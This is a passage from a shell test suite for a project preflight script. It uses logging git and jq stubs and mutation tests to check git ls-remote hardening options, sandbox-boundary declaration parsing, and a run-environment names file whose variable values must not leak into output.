  _gs=$(mktemp -d); _gl="$_gs/log"; : > "$_gl"; _rg=$(command -v git)
  { printf '#!/bin/sh\n'; printf 'printf "%%s|%%s\\n" "$*" "${GIT_SSH_COMMAND:-}" >> "%s"\n' "$_gl"; printf 'exec %s "$@"\n' "$_rg"; } > "$_gs/git"; chmod +x "$_gs/git"
  _g_path="$_gs"; _g_dir="$_og/work"; _g_decl=real; _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"
  git -C "$_og/work" checkout -q -f main 2>/dev/null
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  _bn_on=$(grep -c 'ls-remote' "$_gl" || true)
  : > "$_gl"; _g_proj="$_bnd/off.json"; _g_user=""
  _bnd_run "$_self" "--boundary-advisory"
  _bn_off=$(grep -c 'ls-remote' "$_gl" || true)
  _bn_ssh=$(grep -c 'ls-remote.*|ssh -o BatchMode=yes -o ConnectTimeout=5 -o ServerAliveInterval=5 -o ServerAliveCountMax=2 -o StrictHostKeyChecking=yes$' "$_gl" || true)
  _bn_low=$(grep -c '^-c http.lowSpeedLimit=1000 -c http.lowSpeedTime=20 .*ls-remote' "$_gl" || true)   # S4: the http stall bound
  _bn_ext=$(grep -c '^-c http.lowSpeedLimit=1000 -c http.lowSpeedTime=20 -c protocol.ext.allow=never .*ls-remote' "$_gl" || true)   # S13
  if [ "$_bn_on" -ge 1 ]; then echo "PASS: no-read-when-on [boundary-only] --boundary-only always reads the declaration ($_bn_on ls-remote calls)"; else echo "FAIL: no-read-when-on [boundary-only] --boundary-only never called ls-remote"; fail=1; fi
  : > "$_gl"; _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"
  _bnd_run "$_self" "--boundary-advisory"
  _bn_none=$(grep -c 'ls-remote' "$_gl" || true)
  if [ "$_bn_none" -eq 0 ]; then echo "PASS: no-read-when-on [plain run] an all-ON session made no ls-remote call for the declaration"; else echo "FAIL: no-read-when-on [plain run] an all-ON session called ls-remote $_bn_none times"; fail=1; fi
  if [ "$_bn_off" -ge 1 ]; then echo "PASS: no-read-when-on [non-vacuous] an OFF sandbox does read it ($_bn_off ls-remote calls)"; else echo "FAIL: no-read-when-on [non-vacuous] an OFF sandbox made no ls-remote call, so the zero above proves nothing"; fail=1; fi
  if [ "$_bn_ssh" -ge 1 ] && [ "$_bn_ssh" -eq "$_bn_off" ]; then echo "PASS: ssh-batchmode every ls-remote ran with GIT_SSH_COMMAND='ssh -o BatchMode=yes -o ConnectTimeout=5 -o ServerAliveInterval=5 -o ServerAliveCountMax=2 -o StrictHostKeyChecking=yes'"; else echo "FAIL: ssh-batchmode $_bn_ssh of $_bn_off ls-remote calls carried BatchMode"; fail=1; fi
  if [ "$_bn_low" -ge 1 ] && [ "$_bn_low" -eq "$_bn_off" ]; then echo "PASS: stall-bound every ls-remote carried http.lowSpeedLimit and http.lowSpeedTime"; else echo "FAIL: stall-bound $_bn_low of $_bn_off ls-remote calls carried the http stall bound"; fail=1; fi
  # S8 / S13: each option is load-bearing, shown red: a copy without it records ls-remote calls that lack it. N1: the mutant must apply (cmp), parse (sh -n) and reach ls-remote.
  _bn_mutrun() {  # <name> <sed expr> <grep pattern the original carries>: sets _bn_mutl (ls-remote calls the mutant made) and _bn_muth (of them carrying the pattern); _bn_mutl=-1 if it did not apply or parse
    _bk=$(mktemp -d); sed "$2" "$_self" > "$_bk/preflight.sh"; cp "$(dirname -- "$_self")/incept.sh" "$_bk/incept.sh"; _bn_mutl=-1; _bn_muth=0   # SWAS-784: the copy reads the marker list from the incept.sh beside it
    if cmp -s "$_self" "$_bk/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -rf "$_bk"; return 0; fi
    if ! sh -n "$_bk/preflight.sh" 2>/dev/null; then echo "FAIL: mutant $1 does not parse"; fail=1; rm -rf "$_bk"; return 0; fi
    : > "$_gl"; _g_proj="$_bnd/off.json"; _g_user=""; _g_path="$_gs"; _g_dir="$_og/work"; _g_decl=real
    _bnd_run "$_bk/preflight.sh" "--boundary-advisory"
    _bn_mutl=$(grep -c 'ls-remote' "$_gl" || true); _bn_muth=$(grep -c "$3" "$_gl" || true); rm -rf "$_bk"
  }
  _bn_mutrun strict-host-key-dropped '/MUT-STRICTHOST/s/ -o StrictHostKeyChecking=yes//' 'StrictHostKeyChecking=yes'
  if [ "$_bn_off" -ge 1 ] && [ "$_bn_mutl" -ge 1 ] && [ "$_bn_muth" -eq 0 ]; then echo "PASS: mutant strict-host-key-dropped is killed (the original carries it on $_bn_off ls-remote calls, the mutant ran $_bn_mutl and none carries it)"; else echo "FAIL: mutant strict-host-key-dropped survived or never reached ls-remote ($_bn_mutl calls, $_bn_muth carrying it)"; fail=1; fi
  # S13 belt: every ls-remote carries protocol.ext.allow=never (the file belt applies only outside the seam, so it is not asserted here)
  if [ "$_bn_off" -ge 1 ] && [ "$_bn_ext" -eq "$_bn_off" ]; then echo "PASS: ext-belt every ls-remote carried -c protocol.ext.allow=never"; else echo "FAIL: ext-belt $_bn_ext of $_bn_off ls-remote calls carried protocol.ext.allow=never"; fail=1; fi
  _bn_mutrun ext-belt-dropped "/MUT-BELT/s/_bo_belt='-c protocol.ext.allow=never'/_bo_belt=''/" 'protocol.ext.allow=never .*ls-remote'   # (C1's own logged git calls carry the same flag, so the pattern is the ls-remote lines)
  if [ "$_bn_mutl" -ge 1 ] && [ "$_bn_muth" -eq 0 ]; then echo "PASS: mutant ext-belt-dropped is killed (the mutant ran $_bn_mutl ls-remote calls, none with the belt)"; else echo "FAIL: mutant ext-belt-dropped survived or never reached ls-remote ($_bn_mutl calls, $_bn_muth with the belt)"; fail=1; fi
  _g_path=""; _g_dir=""; _g_decl=""; _g_proj="$_bnd/off.json"; _g_user=""

  # 12: a jq that prints a PARTIAL result and then fails (Linux jq 1.7) on the two NEW jq reads (DC20 and the user-host count) reads as exactly one
  # UNVERIFIED line each, never a listing, never a count, and the run still reaches the end of the block (no abort under set -eu).
  _js=$(mktemp -d); _rj=$(command -v jq)
  printf '%s\n' '#!/bin/sh' 'case "$*" in' "  *'WebFetch(domain:'*) echo \"3 example.org\"; exit 2 ;;" '  *allowedDomains*) echo 2; exit 2 ;;' 'esac' "exec $_rj \"\$@\"" > "$_js/jq"; chmod +x "$_js/jq"
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict-hosts.json"; _g_local="$_bnd/local-wf1.json"; _g_decl=@absent; _g_path="$_js"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  _jq_n=$(printf '%s\n' "$_br_out" | grep -c 'could not be read for saved WebFetch(domain:) allows (UNVERIFIED)' || true)
  _jq_h=$(printf '%s\n' "$_br_out" | grep -c 'allowedDomains could not be counted (UNVERIFIED)' || true)
  if [ "$_jq_n" -eq 1 ] && [ "$_jq_h" -eq 1 ]; then echo "PASS: jq-partial [new reads] a partial-then-fail jq reads as exactly one UNVERIFIED line on the DC20 read and on the host count"; else echo "FAIL: jq-partial [new reads] expected one UNVERIFIED line each (dc20 $_jq_n, hosts $_jq_h): $_br_out"; fail=1; fi
  case "$_br_out" in
    *"saved WebFetch(domain:) allow(s) in"*|*"holds 2 host"*|*"example.org"*) echo "FAIL: jq-partial [new reads] a partial result leaked into the output ($_br_out)"; fail=1 ;;
    *"web: WebFetch denied"*) echo "PASS: jq-partial [new reads] no partial listing or count, and the run reached the end of the block" ;;
    *) echo "FAIL: jq-partial [new reads] the run did not reach the web line (an abort?) ($_br_out)"; fail=1 ;;
  esac

  # (_bnd_kill is defined above, before the real-origin cells that use it)
  _sc() {  # <project> <user> <local> <managed> <declaration seam> <env word>: the scenario for _bnd_kill
    _g_proj=$1; _g_user=$2; _g_local=$3; _g_mgd=$4; _g_decl=$5; _g_env=$6; _g_dir=""; _g_path=""; _g_os=""; _g_home=""
  }
  _sc "$_bnd/full.json" "$_bnd/user-strict-hosts.json" "$_bnd/local-wf1.json" "" @absent ""; _g_path="$_js"
  _bnd_kill jq-streams-partial '/MUT-DC20JQ/s/2>\/dev\/null) || _bw=unreadable/2>\/dev\/null || echo unreadable)/;/in   # MUT-DC20NL$/,/^  esac$/d' "--boundary-only --boundary-advisory" has 'could not be read for saved WebFetch(domain:) allows (UNVERIFIED)'
  _g_path=""; _g_local=""; rm -rf "$_js"
  _sc "$_bnd/off.json" "" "" "" @absent ""
  _bnd_kill undeclared-not-failing '/MUT-BFAIL/s/bfail=1/:/' "" moves yes
  _bnd_kill advisory-sets-exit '/MUT-ADVISORY/s/ \&\& \[ "\$BOUNDARY_ADVISORY" -eq 0 \]//' "" moves yes
  _sc "$_bnd/off.json" "" "" "" "$_bnd/d-all.conf" ""
  _bnd_kill declared-sets-bfail '/MUT-DECLARED/s/:   #/bfail=1   #/' "" moves no
  _sc "$_bnd/off.json" "" "" "" "$_bnd/m-eq.conf" ""
  _bnd_kill eq-in-value-accepted '/MUT-EQ/s/= 4 \]/-ge 0 ]/' "--boundary-only --boundary-advisory" has 'declaration MALFORMED'
  _sc "$_bnd/off.json" "" "" "" "$_bnd/m-partial.conf" ""
  _bnd_kill malformed-partial-accept '/MUT-MALFORMED/s/then BD_WHY="line \$_bp_n: \$BD_WHY"; return 0; fi/then BD_RECS=$_bp_acc; BD_STATE=ok; return 0; fi/' "--boundary-only --boundary-advisory" has 'declaration MALFORMED'
  _sc "$_bnd/off.json" "" "" "" "$_bnd/m-five.conf" ""
  _bnd_kill record-cap-removed '/MUT-CAP/s/-le 4 \]/-le 99 ]/' "--boundary-only --boundary-advisory" has 'line 5: more than 4 records'
  _sc "$_bnd/off.json" "" "" "" @nonregular ""
  _bnd_kill nonregular-blob-absent '/MUT-NONREG/s/BD_STATE=malformed; BD_WHY="[^"]*"/BD_STATE=absent/' "--boundary-only --boundary-advisory" has 'declaration MALFORMED'
  _sc "$_bnd/full.json" "$_bnd/user-strict.json" "" "" "$_bnd/d-egress.conf" ""
  _bnd_kill stale-silent '/MUT-STALE/s/\[ "\$_bs_st" != ON \] || printf/: printf/' "--boundary-only" has 'is STALE'
  _sc "$_bnd/full.json" "$_bnd/user-strict.json" "" "" @absent SANDBOX_RUNTIME=1
  _bnd_kill label-drops-agent-reported '/MUT-AGENTMARK/s/.*/  :/' "--boundary-only --boundary-advisory" has 'agent-reported'
  _sc "$_bnd/full.json" "" "$_bnd/off.json" "" @absent CI=true
  _bnd_kill ci-reads-local '/MUT-CILOCAL/s/continue/:/' "--boundary-only --boundary-advisory" has 'ok   boundary: ON [declared]'
  _sc "$_bnd/full.json" "" "" "$_bnd/off.json" @absent CI=true
  _bnd_kill ci-tier-reads-local '/MUT-CIUSER/s/continue/:/' "--boundary-only --boundary-advisory" has 'ok   boundary: ON [declared]'
  _sc "$_bnd/full.json" "$_bnd/user-plain.json" "$_bnd/local-wf4.json" "" @absent ""
  _bnd_kill dc20-host-unvalidated 's/select(test("^\[a-z0-9\]/select(true or test("^[a-z0-9]/' "--boundary-only --boundary-advisory" has '(and 3 more entries not printed)'
  # working-tree-read: the REAL reader, a clone whose origin has no declaration and whose working tree does
  git clone -q "$_og/origin.git" "$_og/wt2" 2>/dev/null; mkdir -p "$_og/wt2/.kit"; cp "$_bnd/d-all.conf" "$_og/wt2/.kit/boundary-optout.conf"
  _sc "$_bnd/off.json" "" "" "" real ""; _g_dir="$_og/wt2"
  _bnd_kill working-tree-read '/MUT-WTREAD/s/boundary_rel_blob "\$_bo_tip" \.kit\/boundary-optout\.conf/cat .kit\/boundary-optout.conf/' "--boundary-only --boundary-advisory" has 'OFF and UNDECLARED'
  _g_dir=""
  rm -rf "$_og" "$_gs"

  # 28: the third copy of the origin-branch reader stays in step with the other two (a fixed set of load-bearing lines in all three).
  for _cf in "$_self" "$_sd/doctor.sh" "$_sd/promotion-verify.sh"; do
    _cfm=""
    for _cs in 'ls-remote --symref origin HEAD' 'refs/heads/?*)' '*[!A-Za-z0-9._/-]*)' 'GIT_NO_REPLACE_OBJECTS=1' '100644|100755)'; do
      grep -qF -- "$_cs" "$_cf" 2>/dev/null || _cfm="$_cfm [$_cs]"
    done
    if [ -z "$_cfm" ]; then echo "PASS: origin-reader-coupling $(basename -- "$_cf") keeps the five load-bearing lines"; else echo "FAIL: origin-reader-coupling $(basename -- "$_cf") lost:$_cfm"; fail=1; fi
  done
  # the 354 cell, narrowed: a DECLARED opt-out, a NOT ENFORCED egress and every UNVERIFIED line leave miss, rec and bfail untouched; an UNDECLARED one sets bfail only.
  _bcell() {  # <project> <user> <declaration seam> -> "miss rec bfail" after one check_boundary call (CI and the marker cleared)
    ( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME
      miss=0; rec=0; bfail=0; bunv=0
      PREFLIGHT_SANDBOX_SETTINGS="$1"; PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local; PREFLIGHT_SANDBOX_USER="$2"; PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed; PREFLIGHT_BOUNDARY_OPTOUT="$3"
      PREFLIGHT_SANDBOX_OS=Darwin; PREFLIGHT_SANDBOX_TOOLS=sandbox-exec; PREFLIGHT_SANDBOX_BWRAP_OK=1
      export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED PREFLIGHT_BOUNDARY_OPTOUT PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
      check_boundary >/dev/null 2>&1
      printf '%s %s %s' "$miss" "$rec" "$bfail" )
  }
  for _bc in "off-declared|$_bnd/off.json|/nonexistent-user|$_bnd/d-all.conf|0 0 0" "off-unreadable|$_bnd/off.json|/nonexistent-user|@unreadable|0 0 1" "egress-declared|$_bnd/full.json|/nonexistent-user|$_bnd/d-egress.conf|0 0 0" "partial-declared|$_bnd/shortwrite.json|$_bnd/user-strict.json|$_bnd/d-wp.conf|0 0 0" "off-undeclared|$_bnd/off.json|/nonexistent-user|@absent|0 0 1" "egress-undeclared|$_bnd/full.json|/nonexistent-user|@absent|0 0 1"; do
    _bcl=$(printf '%s' "$_bc" | cut -d'|' -f1); _bcw=$(printf '%s' "$_bc" | cut -d'|' -f5)
    _bcg=$(_bcell "$(printf '%s' "$_bc" | cut -d'|' -f2)" "$(printf '%s' "$_bc" | cut -d'|' -f3)" "$(printf '%s' "$_bc" | cut -d'|' -f4)")
    if [ "$_bcg" = "$_bcw" ]; then echo "PASS: boundary accumulators [$_bcl] miss/rec/bfail = $_bcg"; else echo "FAIL: boundary accumulators [$_bcl] expected '$_bcw', got '$_bcg'"; fail=1; fi
  done
  # CI=true with an EMPTY HOME: the new code (the labels, the declared tier, --boundary-only) reaches its end and never reads the home or the network.
  _eh=$(mktemp -d)
  _sc "$_bnd/full.json" "" "" "" @unreadable CI=true; _g_home="$_eh"
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"ok   boundary: ON [declared] (CI set: local and user scopes not read)"*"egress: N/A [declared]"*"web: WebFetch denied"*) echo "PASS: ci-empty-home [boundary-only] CI=true with an empty HOME reaches the end of the block on the declared tier (exit $_br_rc)" ;;
    *) echo "FAIL: ci-empty-home [boundary-only] ($_br_out)"; fail=1 ;;
  esac
  _g_home=""; rm -rf "$_eh"
  # 31: every rc consumer asks for --boundary-advisory. incept (both preflight sites) is driven against a stub preflight that EXITS 1 unless it sees the flag
  # (what a bfail run does), so a dropped flag aborts incept as "missing prerequisites" or leaves the flag off the recorded call. repo-ownership holds its own cells.
  if [ -f "$_sd/incept.sh" ]; then
    _ic=$(mktemp -d); mkdir -p "$_ic/scripts" "$_ic/profiles/typescript-node" "$_ic/adapters/generic"
    printf '{}\n' > "$_ic/adapters/generic/adapter.json"
    printf 'Engineering Principles & Definition of Done\n' > "$_ic/CLAUDE.md"
    printf '%s\n' '#!/bin/sh' 'printf "%s\n" "$*" >> calls' 'if [ -f .kit-run/run-env.names ]; then echo present >> seen; else echo gone >> seen; fi' 'case " $* " in''  *" --boundary-advisory "*) ;;' '  *) exit 1 ;;' 'esac' 'case " $* " in' '  *" --stack "*) exit 1 ;;' 'esac' 'exit 0' > "$_ic/scripts/preflight.sh"
    _ic_run() {  # <incept copy> [NAME=value ...] -> _ic_out; leaves the stub's recorded calls in $_ic/calls and, per call, whether the run-env names file existed in $_ic/seen (SWAS-934)
      _ic_cp=$1; shift
      rm -f "$_ic/calls" "$_ic/seen"; cp "$_ic_cp" "$_ic/scripts/incept.sh"; cp "$_sd/stamp-lib.sh" "$_ic/scripts/stamp-lib.sh"
      _ic_out=$( cd "$_ic" && env -u CI -u GITHUB_ACTIONS -u SANDBOX_RUNTIME -u CLAUDE_CONFIG_DIR -u GH_CONFIG_DIR -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_NOSYSTEM "$@" sh scripts/incept.sh --name T --intent-owner O --stack typescript-node --harness generic < /dev/null 2>&1 ) || true
    }
    _ic_run "$_sd/incept.sh"
    _ic_n=$(grep -c -e '--boundary-advisory' "$_ic/calls" 2>/dev/null || true); _ic_n=${_ic_n:-0}
    case "$_ic_out" in
      *"missing prerequisites"*) echo "FAIL: incept-not-blocked-by-bfail a boundary exit aborted incept at the prerequisites gate ($_ic_out)"; fail=1 ;;
      *"below its declared floor"*) if [ "$_ic_n" -eq 2 ]; then echo "PASS: incept-not-blocked-by-bfail both preflight calls (:416 and the --stack floor call) pass --boundary-advisory and incept got past the prerequisites gate"; else echo "FAIL: incept-not-blocked-by-bfail $_ic_n of 2 preflight calls passed --boundary-advisory"; fail=1; fi ;;
      *) echo "FAIL: incept-not-blocked-by-bfail incept did not reach the stack floor call ($_ic_out)"; fail=1 ;;
    esac
    sed 's/preflight\.sh --boundary-advisory \$_pf_nested/preflight.sh $_pf_nested/' "$_sd/incept.sh" > "$_ic/m1.sh"
    if cmp -s "$_sd/incept.sh" "$_ic/m1.sh"; then echo "FAIL: mutant incept-drops-advisory (:416) did not apply"; fail=1; else
      _ic_run "$_ic/m1.sh"
      case "$_ic_out" in
        *"missing prerequisites"*) echo "PASS: mutant incept-drops-advisory (:416) is killed (a boundary exit aborts incept as missing prerequisites)" ;;
        *) echo "FAIL: mutant incept-drops-advisory (:416) survived ($_ic_out)"; fail=1 ;;
      esac
    fi
    sed 's/preflight\.sh --boundary-advisory --stack/preflight.sh --stack/' "$_sd/incept.sh" > "$_ic/m2.sh"
    if cmp -s "$_sd/incept.sh" "$_ic/m2.sh"; then echo "FAIL: mutant incept-drops-advisory (--stack) did not apply"; fail=1; else
      _ic_run "$_ic/m2.sh"
      _ic_n=$(grep -c -e '--boundary-advisory' "$_ic/calls" 2>/dev/null || true); _ic_n=${_ic_n:-0}
      if [ "$_ic_n" -lt 2 ]; then echo "PASS: mutant incept-drops-advisory (--stack) is killed (the floor call records no flag)"; else echo "FAIL: mutant incept-drops-advisory (--stack) survived"; fail=1; fi
    fi
    # SWAS-934, re-incept: a stale names file is gone before the FIRST preflight call, so incept's own calls never read it; a redirected run writes it (names only) before that call too.
    mkdir -p "$_ic/.kit-run"; printf 'GH_CONFIG_DIR\n' > "$_ic/.kit-run/run-env.names"
    _ic_run "$_sd/incept.sh"
    _ic_seen=$(head -n 1 "$_ic/seen" 2>/dev/null || true)
    case "$_ic_out" in
      *"below its declared floor"*)
        if [ "$_ic_seen" = gone ] && [ ! -e "$_ic/.kit-run/run-env.names" ]; then echo "PASS: run-env-reincept a stale names file was removed before incept's first preflight call, and incept completed past the gate"; else echo "FAIL: run-env-reincept the stale names file survived (first call saw '$_ic_seen')"; fail=1; fi ;;
      *) echo "FAIL: run-env-reincept incept did not reach the stack floor call ($_ic_out)"; fail=1 ;;
    esac
    sed 's#rm -f \.kit-run/run-env\.names 2>/dev/null || true;#true;#' "$_sd/incept.sh" > "$_ic/m3.sh"
    if cmp -s "$_sd/incept.sh" "$_ic/m3.sh"; then echo "FAIL: run-env-reincept mutant (no removal) did not apply"; fail=1; else
      printf 'GH_CONFIG_DIR\n' > "$_ic/.kit-run/run-env.names"; _ic_run "$_ic/m3.sh"
      _ic_seen=$(head -n 1 "$_ic/seen" 2>/dev/null || true)
      if [ "$_ic_seen" = present ]; then echo "PASS: run-env-reincept mutant (no removal) is killed (the stale file reaches the first call)"; else echo "FAIL: run-env-reincept mutant (no removal) survived (first call saw '$_ic_seen')"; fail=1; fi
    fi
    rm -f "$_ic/.kit-run/run-env.names"
    _ic_run "$_sd/incept.sh" CLAUDE_CONFIG_DIR=sentinel-claude-4e1b GIT_CONFIG_NOSYSTEM=sentinel-nosys-4e1b
    _ic_seen=$(head -n 1 "$_ic/seen" 2>/dev/null || true)
    _ic_file=$(cat "$_ic/.kit-run/run-env.names" 2>/dev/null || true)
    if [ "$_ic_seen" = present ] && [ "$_ic_file" = "$(printf 'CLAUDE_CONFIG_DIR\nGIT_CONFIG_NOSYSTEM')" ]; then echo "PASS: run-env-record a redirected incept wrote exactly the set trigger and carried names, in order, before its first preflight call"; else echo "FAIL: run-env-record the names file reads '$_ic_file' (first call saw '$_ic_seen')"; fail=1; fi
    case "$_ic_out$_ic_file" in
      *sentinel-*) echo "FAIL: run-env-sentinel a variable's value reached incept's output or the names file"; fail=1 ;;
      *) echo "PASS: run-env-sentinel no variable's value is in incept's output or the names file" ;;
    esac
    rm -rf "$_ic"
  else
    echo "PASS: (skip) incept cells: no scripts/incept.sh beside this script"
  fi

  # SWAS-934: the run-env leg. A fixture is an export-class directory (a CLAUDE.md with the principles heading) that is its own git repository, so the leg, which sits after the CP-11 and CP-4 refusals, is reached; every run unsets the four names first, so this shell's own never leak in.
  _re_run() {  # <dir> <flags> [NAME=value ...] -> _re_out, _re_rc
    _rt_dir=$1; _rt_fl=$2; shift 2; _re_rc=0
    mkdir -p "$_bnd/emptyhome"
    # shellcheck disable=SC2086  # $_rt_fl is a short flag list
    _re_out=$( cd "$_rt_dir" && env -u CI -u GITHUB_ACTIONS -u CLAUDE_CONFIG_DIR -u GH_CONFIG_DIR -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_NOSYSTEM HOME="$_bnd/emptyhome" PREFLIGHT_GH_CMD=false "$@" sh "$_self" --boundary-offline $_rt_fl 2>&1 ) || _re_rc=$?
  }
  _re_fix() {  # <names file content, or @none> -> _re_d: a fresh fixture
    _re_d=$(mktemp -d); printf 'Engineering Principles & Definition of Done\n' > "$_re_d/CLAUDE.md"
    git init -q "$_re_d" >/dev/null 2>&1 || true
    if [ "$1" != "@none" ]; then mkdir "$_re_d/.kit-run"; printf '%s\n' "$1" > "$_re_d/.kit-run/run-env.names"; fi
  }
  _re_has() {
    case "$_re_out" in
      *"$2"*) echo "PASS: $1: $3" ;;
      *) echo "FAIL: $1: $3 (missing '$2')"; fail=1 ;;
    esac
  }
  _re_hasnt() {
    case "$_re_out" in
      *"$2"*) echo "FAIL: $1: $3 (found '$2')"; fail=1 ;;
      *) echo "PASS: $1: $3" ;;
    esac
  }
  _re_rcis() { if [ "$_re_rc" -eq "$2" ]; then echo "PASS: $1: $3"; else echo "FAIL: $1: $3 (exit $_re_rc, wanted $2)"; fail=1; fi; }
  _re_ok_text="  ok   run-env: the session has every variable recorded at inception (CLAUDE_CONFIG_DIR GH_CONFIG_DIR)"
  _re_gone_text="was set when this project was incepted and is empty or unset in this session"
  _re_fix "$(printf 'CLAUDE_CONFIG_DIR\nGH_CONFIG_DIR')"
  _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=/sentinel/c GH_CONFIG_DIR=/sentinel/g
  _re_has run-env-ok "$_re_ok_text" "every recorded name present reads ok"
  _re_hasnt run-env-ok "FAIL run-env" "no FAIL when every recorded name is present"
  rm -rf "$_re_d"
  _re_fix GH_CONFIG_DIR
  _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=/sentinel/c
  _re_has run-env-unset "  FAIL run-env: GH_CONFIG_DIR $_re_gone_text" "a recorded name unset reads FAIL"
  _re_has run-env-unset "delete .kit-run/run-env.names." "the Fix line names deleting the names file"
  _re_hasnt run-env-unset "  ok   run-env" "an unset name is never read ok"
  _re_rcis run-env-unset 1 "a plain run exits 1"
  rm -rf "$_re_d"
  _re_fix GH_CONFIG_DIR
  _re_run "$_re_d" "" GH_CONFIG_DIR=
  _re_has run-env-empty "  FAIL run-env: GH_CONFIG_DIR $_re_gone_text" "a recorded name set but empty reads FAIL (the references gap)"
  _re_rcis run-env-empty 1 "an empty name exits 1"
  rm -rf "$_re_d"
  _re_mal() {  # <id> <reason> : the fixture in $_re_d is malformed; preflight, with every name and a token variable set, reads no name from it
    _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=/sentinel/c GH_CONFIG_DIR=/sentinel/g GH_TOKEN=/sentinel/t
    _re_has "$1" "  FAIL run-env: .kit-run/run-env.names is malformed ($2), so the run environment cannot be checked." "reads FAIL malformed ($2)"
    _re_hasnt "$1" "  ok   run-env" "a malformed file is never read as a name list"
    _re_hasnt "$1" "/sentinel/t" "no variable's value reaches the output"
    _re_rcis "$1" 1 "a malformed file exits 1"
    rm -rf "$_re_d"
  }
  _re_fix GH_TOKEN; _re_mal run-env-malformed-token "an unknown name"
  _re_fix @none; mkdir "$_re_d/.kit-run"; dd if=/dev/zero bs=600 count=1 2>/dev/null | tr '\0' 'A' > "$_re_d/.kit-run/run-env.names"; _re_mal run-env-malformed-big "over 512 bytes"
  _re_fix GH_CONFIG_DIR; chmod 000 "$_re_d/.kit-run/run-env.names"
  if [ "$(id -u)" -eq 0 ] || [ -r "$_re_d/.kit-run/run-env.names" ]; then
    echo "SKIP: run-env-unreadable this user reads a mode-000 file, so the case cannot be built here: not exercised"; _pf_skips=$((_pf_skips + 1)); rm -rf "$_re_d"
  else
    _re_mal run-env-unreadable "unreadable"
  fi
  _re_fix "$(printf 'GH_CONFIG_DIR\nGH_CONFIG_DIR')"; _re_mal run-env-malformed-repeat "a repeated name"
  _re_fix "$(printf 'CLAUDE_CONFIG_DIR\nGH_CONFIG_DIR\nGIT_CONFIG_GLOBAL\nGIT_CONFIG_NOSYSTEM\nCLAUDE_CONFIG_DIR')"; _re_mal run-env-malformed-five "more than 4 lines"
  _re_fix @none; mkdir "$_re_d/.kit-run"; printf 'GH_CONFIG_DIR\n' > "$_re_d/real.names"; ln -s "$_re_d/real.names" "$_re_d/.kit-run/run-env.names"; _re_mal run-env-malformed-symlink "a symlink"
  _re_fix @none; mkdir -p "$_re_d/.kit-run/run-env.names"; _re_mal run-env-malformed-dir "not a regular file"
  _re_fix @none
  _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=/sentinel/c
  _re_has run-env-absent "Recommended (GitHub-based flows" "the run reached the leg's place in the output"
  _re_hasnt run-env-absent "run-env" "no names file is N/A, with no line"
  _re_run "$_re_d" "--boundary-advisory"; _re_base=$_re_rc
  rm -rf "$_re_d"
  _re_fix GH_CONFIG_DIR
  _re_run "$_re_d" "--boundary-advisory"
  _re_has run-env-advisory "  WARN run-env: GH_CONFIG_DIR $_re_gone_text" "under --boundary-advisory a missing name reads WARN"
  _re_hasnt run-env-advisory "FAIL run-env" "under --boundary-advisory it is never a FAIL"
  if [ "$_re_rc" -eq "$_re_base" ]; then echo "PASS: run-env-advisory this leg moves no exit under --boundary-advisory (exit $_re_rc, the same as with no names file)"; else echo "FAIL: run-env-advisory the leg moved the exit ($_re_rc against $_re_base)"; fail=1; fi
  rm -rf "$_re_d"
  _re_fix "$(printf 'CLAUDE_CONFIG_DIR\nGH_CONFIG_DIR\nGIT_CONFIG_GLOBAL\nGIT_CONFIG_NOSYSTEM')"
  _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=sentinel-claude-7a1 GH_CONFIG_DIR=sentinel-gh-7a1 GIT_CONFIG_GLOBAL=sentinel-git-7a1 GIT_CONFIG_NOSYSTEM=sentinel-nosys-7a1
  _re_has run-env-sentinel "  ok   run-env:" "the all-present run reads ok"
  _re_hasnt run-env-sentinel "sentinel-" "no variable's value is in preflight's output (ok branch)"
  _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=sentinel-claude-7a1 GIT_CONFIG_GLOBAL=sentinel-git-7a1 GIT_CONFIG_NOSYSTEM=sentinel-nosys-7a1
  _re_has run-env-sentinel "  FAIL run-env: GH_CONFIG_DIR" "the one-missing run reads FAIL"
  _re_hasnt run-env-sentinel "sentinel-" "no variable's value is in preflight's output (FAIL branch)"
  rm -rf "$_re_d"
  _re_fix GH_TOKEN
  _re_run "$_re_d" "" CLAUDE_CONFIG_DIR=sentinel-claude-7a1 GH_CONFIG_DIR=sentinel-gh-7a1 GIT_CONFIG_GLOBAL=sentinel-git-7a1 GIT_CONFIG_NOSYSTEM=sentinel-nosys-7a1
  _re_has run-env-sentinel "is malformed (an unknown name)" "the malformed run, with all four variables set, reads FAIL malformed"
  _re_hasnt run-env-sentinel "sentinel-" "no variable's value is in preflight's output (malformed branch)"
  rm -rf "$_re_d"
  # the exit counter, proved directly (the file's _bcell shape): one check_run_env call in a subshell with one recorded name missing; miss moves to 1 on a plain run and stays 0 under the flag.
  _rm_cell() {  # <BOUNDARY_ADVISORY value> -> miss after one check_run_env call in the fixture
    ( unset CLAUDE_CONFIG_DIR GH_CONFIG_DIR GIT_CONFIG_GLOBAL GIT_CONFIG_NOSYSTEM
      miss=0; BOUNDARY_ADVISORY=$1; RUNENV_FAILED=0
      cd "$_re_d" && check_run_env >/dev/null
      printf '%s' "$miss" )
  }
  _re_fix GH_CONFIG_DIR
  _rm_plain=$(_rm_cell 0) || _rm_plain="<aborted>"
  _rm_adv=$(_rm_cell 1) || _rm_adv="<aborted>"
  rm -rf "$_re_d"
